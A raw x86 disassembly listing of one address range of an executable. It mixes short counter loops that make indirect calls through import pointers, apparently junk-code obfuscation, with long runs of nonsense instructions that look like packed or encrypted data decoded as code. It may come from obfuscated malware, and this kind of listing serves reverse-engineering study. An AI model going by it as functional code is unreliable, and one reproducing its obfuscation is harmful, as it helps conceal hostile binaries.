  40a220:	jbe    0x40a1e5
  40a222:	clc    
  40a223:	adc    eax,0x863c2d51
  40a228:	in     eax,dx
  40a229:	jne    0x40a2a9
  40a22b:	out    0x5e,eax
  40a22d:	in     eax,dx
  40a22e:	mov    DWORD PTR [ebp-0x4],0xf89c85d1
  40a235:	mov    DWORD PTR [ebp-0x28],0xf89c8533
  40a23c:	adc    edx,edx
  40a23e:	mov    DWORD PTR [ebp-0x2c],0xf89c8532
  40a245:	and    DWORD PTR ds:0x42fced,0x0
  40a24f:	jmp    0x40a263
  40a254:	xor    edx,edx
  40a256:	or     edx,DWORD PTR ds:0x42fced
  40a25c:	inc    edx
  40a25d:	mov    DWORD PTR ds:0x42fced,edx
  40a263:	cmp    DWORD PTR ds:0x42fced,0x10
  40a26a:	jae    0x40a2a2
  40a270:	cmp    DWORD PTR ds:0x42fced,0x14
  40a277:	jne    0x40a297
  40a27d:	push   0x83c5
  40a282:	push   0x5a78
  40a287:	push   0x49ef
  40a28c:	push   0x22e4
  40a291:	call   DWORD PTR ds:0x42e2e7
  40a297:	jmp    0x40a254
  40a29c:	add    DWORD PTR ds:0x42e128,edx
  40a2a2:	mov    DWORD PTR [ebp-0x30],0xf89c853d
  40a2a9:	and    DWORD PTR ds:0x42e70f,0x7d59
  40a2b3:	jmp    0x40a671
  40a2b8:	into   
  40a2b9:	iret   
  40a2ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a2bb:	cmp    esp,DWORD PTR [ebp+0x7cc97171]
  40a2c1:	sbb    bl,BYTE PTR [edi+0x2b]
  40a2c4:	cli    
  40a2c5:	mov    bl,0xd6
  40a2c7:	xchg   edi,eax
  40a2c8:	inc    ebp
  40a2c9:	cmc    
  40a2ca:	jo     0x40a33c
  40a2cc:	lahf   
  40a2cd:	jge    0x40a33f
  40a2cf:	jo     0x40a341
  40a2d1:	push   0x73
  40a2d3:	sbb    al,0xc8
  40a2d5:	mov    BYTE PTR [ebx-0x2284fad7],bl
  40a2db:	ret    0xfb24
  40a2de:	stc    
  40a2df:	lea    ebp,[ebx-0x2c]
  40a2e2:	fstp   st(4)
  40a2e4:	xchg   ecx,eax
  40a2e5:	in     eax,dx
  40a2e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2e7:	cwde   
  40a2e8:	or     DWORD PTR [ebx],edx
  40a2ea:	jmp    0x3798aaff
  40a2ef:	aam    0x55
  40a2f1:	sar    DWORD PTR [ecx-0x42457147],cl
  40a2f7:	dec    esi
  40a2f8:	mov    ecx,0xbd8904cb
  40a2fd:	cmp    al,0x69
  40a2ff:	mov    BYTE PTR [edx],ah
  40a301:	sbb    dl,cl
  40a303:	sub    DWORD PTR [ecx],esp
  40a305:	and    DWORD PTR [eax+0x29c953bc],0x89c8ff60
  40a30f:	dec    edi
  40a310:	iret   
  40a311:	or     al,BYTE PTR [edi+0x50]
  40a314:	push   esp
  40a315:	cmp    eax,DWORD PTR [ebx]
  40a317:	mov    ebp,DWORD PTR [eax+0x2392bc0a]
  40a31d:	mov    ds:0xe6919da4,al
  40a322:	mov    eax,ds:0xb7f2336d
  40a327:	push   ss
  40a328:	mov    WORD PTR [esi],?
  40a32a:	sub    ah,cl
  40a32c:	and    ecx,DWORD PTR [ecx+0x31]
  40a32f:	mov    BYTE PTR [ecx+0x49cf12ed],dl
  40a335:	push   cs
  40a336:	and    al,0x25
  40a338:	sbb    eax,0xadbfc87a
  40a33d:	enter  0xd56c,0x2a
  40a341:	sub    cl,0x6e
  40a344:	inc    esp
  40a345:	inc    esi
  40a346:	pop    ebp
  40a347:	sahf   
  40a348:	jmp    0x28a9b6a5
  40a34d:	or     eax,0x4838b4df
  40a352:	jns    0x40a3a4
  40a354:	jbe    0x40a37d
  40a356:	mov    ah,0xfe
  40a358:	xchg   ecx,eax
  40a359:	retf   0xf2cf
  40a35c:	mov    ebx,0xc918ab88
  40a361:	and    DWORD PTR [esi-0x1c75a8c9],ebx
  40a367:	mov    bh,0xa7
  40a369:	mov    al,ds:0x6cb2b17a
  40a36e:	(bad)  
  40a36f:	xchg   esi,eax
  40a370:	test   al,0x67
  40a372:	in     eax,0x1d
  40a374:	push   ecx
  40a375:	ds loop 0x40a347
  40a378:	fcomp  st(2)
  40a37a:	adc    bl,cl
  40a37c:	enter  0x39f2,0x77
  40a380:	jle    0x40a339
  40a382:	push   ebx
  40a383:	int    0x56
  40a385:	xchg   esp,eax
  40a386:	pop    ebx
  40a387:	sbb    DWORD PTR [ebx-0x4c313089],edi
  40a38d:	enter  0x5f6,0xda
  40a391:	cmp    BYTE PTR es:0xade6aaf6,cl
  40a398:	push   ds
  40a399:	std    
  40a39a:	jns    0x40a405
  40a39c:	jnp    0x40a3b1
  40a39e:	inc    edx
  40a39f:	mov    al,0x51
  40a3a1:	xor    edx,DWORD PTR [esi]
  40a3a3:	pushf  
  40a3a4:	leave  
  40a3a5:	ja     0x40a39f
  40a3a7:	stos   BYTE PTR es:[edi],al
  40a3a8:	add    esp,DWORD PTR [edi+0x79bc5b74]
  40a3ae:	rol    DWORD PTR [edi],cl
  40a3b0:	popf   
  40a3b1:	push   esi
  40a3b2:	add    BYTE PTR [ebp-0x910ef93],dl
  40a3b8:	fwait
  40a3b9:	sbb    BYTE PTR [edi-0x75357eef],cl
  40a3bf:	jge    0x40a36e
  40a3c1:	cs adc eax,0x7b1236ad
  40a3c7:	mov    bh,ch
  40a3c9:	dec    eax
  40a3ca:	adc    BYTE PTR [edi+0x39],0xff
  40a3ce:	loope  0x40a40a
  40a3d0:	push   0xffffffcd
  40a3d2:	xor    edx,DWORD PTR ds:0x4da6c315
  40a3d8:	int3   
  40a3d9:	and    eax,0x83c80836
  40a3de:	mov    DWORD PTR [eax+0x45a95af8],ebx
  40a3e4:	nop
  40a3e5:	mov    dh,0x91
  40a3e7:	mov    ebp,0x87f976b6
  40a3ec:	and    al,0xbe
  40a3ee:	fwait
  40a3ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3f0:	or     DWORD PTR [edi],esi
  40a3f2:	adc    edi,esi
  40a3f4:	push   cs
  40a3f5:	xor    DWORD PTR [eax+0x3fe12492],ecx
  40a3fb:	xchg   edi,eax
  40a3fc:	mov    edx,0x1b3f63cd
  40a401:	pop    edx
  40a402:	sub    al,0x34
  40a404:	mov    bh,0xa6
  40a406:	(bad)  
  40a407:	jne    0x40a441
  40a409:	ins    DWORD PTR es:[edi],dx
  40a40a:	jg     0x40a44f
  40a40c:	lock jge 0x40a3e0
  40a40f:	pop    ecx
  40a410:	popf   
  40a411:	les    edx,FWORD PTR [ebx]
  40a413:	inc    edi
  40a414:	add    BYTE PTR [edx+edi*4+0x72400c1e],0xf6
  40a41c:	daa    
  40a41d:	xchg   ebp,eax
  40a41e:	jmp    0x4787:0xba55493a
  40a425:	stos   DWORD PTR es:[edi],eax
  40a426:	dec    ecx
  40a427:	out    0x33,eax
  40a429:	pop    edx
  40a42a:	into   
  40a42b:	pop    edx
  40a42c:	mov    cl,bh
  40a42e:	or     DWORD PTR [ebx-0x1c05bb4],edx
  40a434:	and    edx,edx
  40a436:	push   eax
  40a437:	ss or  dl,ah
  40a43a:	sub    al,0xe7
  40a43c:	out    0xfb,al
  40a43e:	adc    BYTE PTR [ebp-0x48864c77],bl
  40a444:	jp     0x40a493
  40a446:	cmp    esp,DWORD PTR [edx+edx*2-0x75]
  40a44a:	retf   
  40a44b:	mov    cl,0x66
  40a44d:	jbe    0x40a3cf
  40a44f:	mov    BYTE PTR [ecx],bh
  40a451:	xor    DWORD PTR cs:[eax+0x5233a414],edi
  40a458:	pop    esp
  40a459:	div    edx
  40a45b:	dec    eax
  40a45c:	mov    eax,ebp
  40a45e:	nop
  40a45f:	and    al,cl
  40a461:	push   esp
  40a462:	out    dx,al
  40a463:	test   eax,0x49befc75
  40a468:	stos   BYTE PTR es:[edi],al
  40a469:	mov    edx,DWORD PTR [edx-0x39]
  40a46c:	je     0x40a4dc
  40a46e:	sub    eax,0xce1fad46
  40a473:	in     al,0x34
  40a475:	gs or  eax,0xd876c060
  40a47b:	out    0xcc,al
  40a47d:	inc    eax
  40a47e:	lea    ebx,[ecx-0x59]
  40a481:	outs   dx,BYTE PTR ds:[esi]
  40a482:	mov    bl,0x1d
  40a484:	push   es
  40a485:	shr    al,1
  40a487:	push   es
  40a488:	or     DWORD PTR [edx-0x5a],0x19
  40a48c:	sbb    ecx,edi
  40a48e:	cmp    bh,BYTE PTR [ecx]
  40a490:	shr    BYTE PTR [edi],0xb3
  40a493:	cmp    eax,0xe904f45c
  40a498:	xchg   esi,eax
  40a499:	inc    esi
  40a49a:	bound  ebp,QWORD PTR [edi+0x3e]
  40a49d:	or     eax,0xffffffac
  40a4a0:	xchg   esp,eax
  40a4a1:	dec    esp
  40a4a2:	xchg   edx,eax
  40a4a3:	mov    ch,0xdb
  40a4a5:	sar    DWORD PTR [esi],0x1
  40a4a8:	or     BYTE PTR [ebx-0x53],0x31
  40a4ac:	mov    dh,0x67
  40a4ae:	das    
  40a4af:	sbb    bl,BYTE PTR [esi-0x64]
  40a4b2:	int3   
  40a4b3:	cwde   
  40a4b4:	pop    edi
  40a4b5:	idiv   DWORD PTR [ebx-0x4a]
  40a4b8:	pop    ss
  40a4b9:	xor    al,BYTE PTR [edi-0x27e5512b]
  40a4bf:	push   edi
  40a4c0:	lds    esi,FWORD PTR [eax+0x5a]
  40a4c3:	aad    0xb
  40a4c5:	in     eax,dx
  40a4c6:	mov    esi,0x6f425cf7
  40a4cb:	mov    cl,0x95
  40a4cd:	sbb    cl,dh
  40a4cf:	mov    ah,0x2d
  40a4d1:	xchg   edx,eax
  40a4d2:	je     0x40a4f4
  40a4d4:	and    eax,0x494ab017
  40a4d9:	mov    dh,0x4c
  40a4db:	stc    
  40a4dc:	dec    esi
  40a4dd:	jno    0x40a513
  40a4df:	or     bl,cl
  40a4e1:	out    dx,eax
  40a4e2:	xchg   esi,eax
  40a4e3:	xchg   edx,eax
  40a4e4:	sub    eax,0x9ca829f1
  40a4e9:	ja     0x40a47b
  40a4eb:	mov    al,ds:0x7f25fd17
  40a4f0:	and    eax,0x30998edd
  40a4f5:	push   ss
  40a4f6:	adc    eax,0x64fcd0bf
  40a4fb:	and    eax,0x636bad8e
  40a500:	mov    ch,0x9c
  40a502:	arpl   WORD PTR [esi+0x681dd7fc],si
  40a508:	jbe    0x40a4b6
  40a50a:	leave  
  40a50b:	inc    DWORD PTR [ebx+0x666b2dd1]
  40a511:	inc    ebx
  40a512:	mov    ebx,0x7d0fdc6d
  40a517:	mov    ah,BYTE PTR [esi]
  40a519:	inc    ebp
  40a51a:	test   DWORD PTR [esi+ebx*2+0x7d],esp
  40a51e:	dec    edx
  40a51f:	mov    edi,0xdf463a87
  40a524:	pop    ds
  40a525:	std    
  40a526:	aam    0x5e
  40a528:	ds dec ecx
  40a52a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a52b:	xor    edx,DWORD PTR [ebp+0x42e3e7a8]
  40a531:	adc    BYTE PTR [esi+0x3e],ah
  40a534:	in     al,0x61
  40a536:	cs out 0x2b,eax
  40a539:	shl    BYTE PTR [esi+0x74],1
  40a53c:	dec    edx
  40a53d:	lock test eax,0xb354e644
  40a543:	fld    st(0)
  40a545:	(bad)  
  40a546:	aam    0x22
  40a548:	sbb    al,0xf2
  40a54a:	scas   al,BYTE PTR es:[edi]
  40a54b:	mov    ds:0x8c254dea,eax
  40a550:	sbb    al,0x4
  40a552:	cmp    BYTE PTR [esi-0x36d54737],dh
  40a558:	pop    ebp
  40a559:	mov    DWORD PTR [edi-0x7c1c2106],edi
  40a55f:	prefetcht0 BYTE PTR [ecx]
  40a562:	mov    cl,0x1c
  40a564:	mov    bh,0xda
  40a566:	ins    BYTE PTR es:[edi],dx
  40a567:	mov    eax,ds:0xa2881599
  40a56c:	add    eax,0xee102b3a
  40a571:	add    al,0x19
  40a573:	cmp    bl,ah
  40a575:	xchg   edx,eax
  40a576:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a577:	push   ebp
  40a578:	fnstcw WORD PTR [ecx+0x7c]
  40a57b:	sbb    ah,ah
  40a57d:	sbb    eax,0xc04ff21f
  40a582:	imul   edx,edx,0x50
  40a585:	cmp    ah,BYTE PTR [edx+0xe]
  40a588:	rcl    al,cl
  40a58a:	addr16 dec esi
  40a58c:	loope  0x40a606
  40a58e:	push   ss
  40a58f:	mov    al,BYTE PTR [ebx]
  40a591:	sub    DWORD PTR [ecx+0x1d51d7a6],esi
  40a597:	jbe    0x40a563
  40a599:	xor    al,0x19
  40a59b:	mov    edi,0xc0726dd4
  40a5a0:	fst    QWORD PTR [eax]
  40a5a2:	mov    ebp,DWORD PTR [eax-0x51]
  40a5a5:	jno    0x40a603
  40a5a7:	shl    esi,1
  40a5a9:	into   
  40a5aa:	popf   
  40a5ab:	stos   DWORD PTR es:[edi],eax
  40a5ac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a5ad:	dec    edi
  40a5ae:	dec    ebx
  40a5af:	lods   al,BYTE PTR ds:[esi]
  40a5b0:	cdq    
  40a5b1:	cld    
  40a5b2:	shl    ebx,1
  40a5b4:	fisttp QWORD PTR [eax+esi*8+0x6d081812]
  40a5bb:	xorps  xmm3,XMMWORD PTR [ebx+edx*8+0x3f766410]
  40a5c3:	xor    eax,0xfa4e621f
  40a5c8:	mov    bl,0xbe
  40a5ca:	mov    esi,0xd99d0a3b
  40a5cf:	cld    
  40a5d0:	jns    0x40a5f7
  40a5d2:	iret   
  40a5d3:	and    eax,0xc004bf5
  40a5d8:	loopne 0x40a5f5
  40a5da:	pop    edi
  40a5db:	pop    ebx
  40a5dc:	icebp  
  40a5dd:	imul   ebp,DWORD PTR [esp+ebp*4],0x9947f01d
  40a5e4:	retf   
  40a5e5:	outs   dx,DWORD PTR ds:[esi]
  40a5e6:	adc    ecx,ebx
  40a5e8:	imul   edx,DWORD PTR [esi+edx*8],0xade069da
  40a5ef:	adc    al,BYTE PTR [eax-0xf]
  40a5f2:	push   esp
  40a5f3:	cmp    ebx,DWORD PTR [eax+0x25]
  40a5f6:	test   DWORD PTR [edx-0x17],0x946ca8ba
  40a5fd:	cld    
  40a5fe:	out    dx,eax
  40a5ff:	mov    ds:0x7da336a4,al
  40a604:	mov    esi,0x82eee26c
  40a609:	cdq    
  40a60a:	xchg   DWORD PTR [eax+0x24e91e63],esi
  40a610:	(bad)  
  40a611:	fiadd  WORD PTR [edi+0x0]
  40a614:	mov    WORD PTR [esi-0x21],?
  40a617:	leave  
  40a618:	arpl   WORD PTR [esi],bx
  40a61a:	sahf   
  40a61b:	pop    edi
  40a61c:	sub    al,0xd3
  40a61e:	push   es
  40a61f:	sub    BYTE PTR [edi],bh
  40a621:	and    bl,BYTE PTR [eax+0x3e773d13]
  40a627:	outs   dx,DWORD PTR ds:[esi]
  40a628:	in     eax,dx
  40a629:	mov    al,0xe6
  40a62b:	nop
  40a62c:	popf   
  40a62d:	adc    dh,0x4e
  40a630:	shr    BYTE PTR [edi],1
  40a632:	sub    bl,dl
  40a634:	adc    BYTE PTR [edx-0x43],cl
  40a637:	sub    al,0x4a
  40a639:	mov    esp,DWORD PTR [ecx+0x18]
  40a63c:	imul   ecx,edi,0xfffffff2
  40a63f:	(bad)  
  40a640:	sbb    dl,bh
  40a642:	arpl   WORD PTR [ebp+0xa],si
  40a645:	ss (bad) 
  40a647:	out    0xb8,eax
  40a649:	test   ch,dl
  40a64b:	or     BYTE PTR [edx],0x80
  40a64e:	js     0x40a674
  40a650:	adc    BYTE PTR [edx-0x63],0xd
  40a654:	jl     0x40a689
  40a656:	jmp    0x40a6a4
  40a658:	shl    edi,1
  40a65a:	xchg   ebp,eax
  40a65b:	xchg   esp,eax
  40a65c:	popa   
  40a65d:	cmp    cl,BYTE PTR [ecx-0x2cc0f6e2]
  40a663:	mov    bh,BYTE PTR [ecx]
  40a665:	xchg   edx,eax
  40a666:	mov    ecx,0xc5718042
  40a66b:	dec    ebp
  40a66c:	inc    eax
  40a66d:	dec    esi
  40a66e:	mov    eax,0x45c75f6a
  40a673:	int3   
  40a674:	cmp    al,0x85
  40a676:	pushf  
  40a677:	clc    
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e6ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e6ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e6ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e6ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e6f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e2eb
  40a6c6:	cmp    DWORD PTR ds:0x42e6ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e6ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e6ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e6ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fcdd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fcdd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fcdd,edx
  40a709:	cmp    DWORD PTR ds:0x42fcdd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fcdd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e26d
  40a728:	push   0x42e25b
  40a72d:	call   DWORD PTR ds:0x42e547
  40a733:	cmp    DWORD PTR ds:0x42fcdd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fcdd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fcdd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e134
  40a75a:	xor    edi,DWORD PTR ds:0x42e713
  40a760:	mov    DWORD PTR ds:0x42e134,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e713,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fcd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fce5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e713,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fcf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e130,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e130,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e130,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e1e7
  40a7e8:	push   0x42e23d
  40a7ed:	push   0x42e23d
  40a7f2:	call   DWORD PTR ds:0x42e2ef
  40a7f8:	cmp    DWORD PTR ds:0x42e130,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e130
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e130,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e130
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e130,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e12c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fd6e
  40a839:	add    DWORD PTR ds:0x42e707,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	cld    
  40a854:	aam    0x19
  40a856:	ins    DWORD PTR es:[edi],dx
  40a857:	in     al,0xf1
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a805
  40a860:	pusha  
  40a861:	inc    ebp
  40a862:	adc    bh,BYTE PTR [ecx-0x7d]
  40a865:	stc    
  40a866:	xor    DWORD PTR [ebx-0x52],eax
  40a869:	adc    eax,0xfa1fed5f
  40a86e:	iret   
  40a86f:	rcl    BYTE PTR [esi],0x15
  40a872:	cmp    BYTE PTR [edi+eax*4],0xdc
  40a876:	dec    esi
  40a877:	scas   al,BYTE PTR es:[edi]
  40a878:	ins    DWORD PTR es:[edi],dx
  40a879:	jp     0x40a817
  40a87b:	mov    bl,0x9
  40a87d:	sub    al,0x7f
  40a87f:	mov    DWORD PTR [esi-0xf],esi
  40a882:	pusha  
  40a883:	rcl    dh,cl
  40a885:	jp     0x40a8e5
  40a887:	adc    esi,DWORD PTR [ecx]
  40a889:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a88a:	jmp    0x86bd:0x45a05d0a
  40a891:	pop    edi
  40a892:	ret    0x679c
  40a895:	sub    BYTE PTR [edx],0xb6
  40a898:	dec    edx
  40a899:	test   al,0xd3
  40a89b:	(bad)  
  40a89c:	stc    
  40a89d:	scas   eax,DWORD PTR es:[edi]
  40a89e:	fmul   DWORD PTR [eax-0xb79973c]
  40a8a4:	icebp  
  40a8a5:	fdiv   st,st(6)
  40a8a7:	mov    eax,0x8ec95373
  40a8ac:	shl    edx,cl
  40a8ae:	jge    0x40a8f6
  40a8b0:	xor    al,0xec
  40a8b2:	push   cs
  40a8b3:	fstp   QWORD PTR [ecx-0x41]
  40a8b6:	mov    bh,0x79
  40a8b8:	loop   0x40a87c
  40a8ba:	add    esi,DWORD PTR [esi+0x3b]
  40a8bd:	outs   dx,DWORD PTR ds:[esi]
  40a8be:	xor    BYTE PTR [ebp-0x64],dl
  40a8c1:	out    0x81,eax
  40a8c3:	sub    DWORD PTR [edi],ebp
  40a8c5:	xchg   edi,eax
  40a8c6:	adc    DWORD PTR [ebx+0x6e],ebx
  40a8c9:	xor    DWORD PTR [esp+esi*4-0x1e],edx
  40a8cd:	shr    esp,cl
  40a8cf:	sub    DWORD PTR [ecx],ecx
  40a8d1:	push   ebp
  40a8d2:	mov    dh,0x55
  40a8d4:	loopne 0x40a918
  40a8d6:	test   bh,bh
  40a8d8:	mov    ds:0x73561394,eax
  40a8dd:	in     eax,0x4d
  40a8df:	cmp    ebx,0x58
  40a8e2:	outs   dx,BYTE PTR cs:[esi]
  40a8e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a8e5:	ret    0xc497
  40a8e8:	sbb    esi,DWORD PTR [esi+0xf]
  40a8eb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a8ec:	xor    esi,DWORD PTR [ecx]
  40a8ee:	add    BYTE PTR [edx+0x44],dh
  40a8f1:	enter  0x534a,0x64
  40a8f5:	lods   eax,DWORD PTR ds:[esi]
  40a8f6:	dec    edx
  40a8f7:	lock pop ds
  40a8f9:	mov    cl,0x39
  40a8fb:	mov    dl,0x5c
  40a8fd:	cli    
  40a8fe:	in     eax,dx
  40a8ff:	int    0xa
  40a901:	scas   eax,DWORD PTR es:[edi]
  40a902:	or     eax,0x708167b9
  40a907:	inc    esp
  40a908:	sub    eax,0xce4a368c
  40a90d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a90e:	sbb    al,0x6b
  40a910:	add    DWORD PTR [esi+ebx*1-0x26],ebx
  40a914:	fcom   DWORD PTR [ebp+0x77]
  40a917:	and    BYTE PTR [ebx+0x22fd0da2],bh
  40a91d:	lea    edi,[esi+0x6397edf]
  40a923:	dec    ebx
  40a924:	ins    DWORD PTR es:[edi],dx
  40a925:	ds inc ecx
  40a927:	and    ebp,DWORD PTR [edx-0x6f435e0c]
  40a92d:	cmp    eax,0xfa29b192
  40a932:	and    cl,dl
  40a934:	fadd   DWORD PTR [esi+0x67]
  40a937:	xor    ah,bh
  40a939:	fst    DWORD PTR [ecx-0xabcb536]
  40a93f:	mov    eax,0x7b0025ef
  40a944:	cmp    al,BYTE PTR fs:[eax-0x7c]
  40a948:	arpl   cx,ax
  40a94a:	inc    edx
  40a94b:	xor    esp,DWORD PTR [esi-0x15]
  40a94e:	jge    0x40a944
  40a950:	(bad)  
  40a951:	pusha  
  40a952:	les    edi,FWORD PTR [eax-0x4a3016b5]
  40a958:	xchg   esi,eax
  40a959:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a95a:	xor    al,0xb8
  40a95c:	sbb    eax,0x378d37d
  40a961:	add    BYTE PTR [eax-0x1c],ah
  40a964:	add    eax,0xa5f6d75d
  40a969:	jno    0x40a9cc
  40a96b:	push   es
  40a96c:	popa   
  40a96d:	(bad)  
  40a96e:	mov    esp,0x20feae
  40a973:	shr    al,cl
  40a975:	mov    ds:0xe80322e9,eax
  40a97a:	mov    ds:0xb83f963,al
  40a97f:	mov    eax,0x8767f636
  40a984:	add    al,0x1c
  40a986:	add    eax,0xf6c9c1b5
  40a98b:	cs ds cdq 
  40a98e:	adc    al,0xbf
  40a990:	pusha  
  40a991:	xor    esi,DWORD PTR [edx]
  40a993:	sub    DWORD PTR [ecx+eax*1],eax
  40a996:	ret    0x50bc
  40a999:	jo     0x40a9e0
  40a99b:	repnz xor al,0xf2
  40a99e:	je     0x40a93f
  40a9a0:	pusha  
  40a9a1:	inc    ebx
  40a9a2:	mov    ebp,0x491b91fc
  40a9a7:	mov    DWORD PTR [ebx+0x49],0xcb400987
  40a9ae:	fsubr  DWORD PTR [ebx-0x5e]
  40a9b1:	or     DWORD PTR [ebp+0x3c],0x256a3e66
  40a9b8:	sbb    esi,edx
  40a9ba:	dec    esp
  40a9bb:	call   0x75392136
  40a9c0:	stc    
  40a9c1:	sbb    BYTE PTR [eax-0x7bcd912f],0xbd
  40a9c8:	push   es
  40a9c9:	fbld   TBYTE PTR [ecx+0x2a8058cb]
  40a9cf:	inc    ebp
  40a9d0:	dec    esp
  40a9d1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a9d2:	jmp    0x40a95c
  40a9d4:	inc    esi
  40a9d5:	add    BYTE PTR ds:0x1711bfb7,dh
  40a9db:	mov    WORD PTR [eax+eiz*8+0x38],?
  40a9df:	fsubr  QWORD PTR [ebx+edx*1+0xbb5c1d]
  40a9e6:	out    dx,al
  40a9e7:	or     DWORD PTR ds:0x71aa1273,ebx
  40a9ed:	and    BYTE PTR [ecx+edi*4],ch
  40a9f0:	test   al,0x22
  40a9f2:	out    dx,al
  40a9f3:	popa   
  40a9f4:	daa    
  40a9f5:	repnz mov bh,0x2b
  40a9f8:	in     al,0xb0
  40a9fa:	pop    edi
  40a9fb:	or     DWORD PTR [ebx],ebx
  40a9fd:	(bad)  
  40a9fe:	call   0x533f1fd2
  40aa03:	ror    ah,0x4
  40aa06:	jae    0x40aa43
  40aa08:	xchg   ecx,eax
  40aa09:	retf   
  40aa0a:	into   
  40aa0b:	int    0xd2
  40aa0d:	ror    BYTE PTR [esi+0x46],1
  40aa10:	push   esi
  40aa11:	push   0x5
  40aa13:	add    bh,al
  40aa15:	jle    0x40a9a4
  40aa17:	pop    ds
  40aa18:	pop    eax
  40aa19:	and    BYTE PTR [esi+ebx*8-0x702c3acf],dl
  40aa20:	pop    ecx
  40aa21:	push   ebp
  40aa22:	cmp    bh,BYTE PTR [esi-0x5d6dd425]
  40aa28:	(bad)  
  40aa29:	aas    
  40aa2a:	aas    
  40aa2b:	xor    BYTE PTR [ebx-0x7c996048],dh
  40aa31:	or     ecx,DWORD PTR [eax+0x65]
  40aa34:	(bad)  
  40aa35:	mov    eax,0xccb8e1aa
  40aa3a:	pop    esp
  40aa3b:	or     al,0x47
  40aa3d:	aas    
  40aa3e:	or     esp,DWORD PTR [ebx+0x5fac7ddf]
  40aa44:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa45:	mov    edx,0xcdc7ad66
  40aa4a:	and    DWORD PTR [ebp-0x58],edx
  40aa4d:	scas   eax,DWORD PTR es:[edi]
  40aa4e:	fcomi  st,st(3)
  40aa50:	cld    
  40aa51:	fs pop ebp
  40aa53:	or     bl,BYTE PTR [ebx+edx*4+0x31]
  40aa57:	call   DWORD PTR [ebp-0x1b]
  40aa5a:	mov    cl,0xf5
  40aa5c:	(bad)
  40aa5f:	dec    esi
  40aa60:	add    dh,cl
  40aa62:	sbb    eax,0x88dd9298
  40aa67:	aad    0xf3
  40aa69:	push   ecx
  40aa6a:	data16 lock repz arpl WORD PTR [edx+eiz*1],di
  40aa70:	xor    ebp,esi
  40aa72:	pop    ecx
  40aa73:	mov    WORD PTR [eax-0x1ca462bf],?
  40aa79:	int3   
  40aa7a:	adc    dl,BYTE PTR [ecx+0x3b]
  40aa7d:	inc    ecx
  40aa7e:	retf   0xd5e5
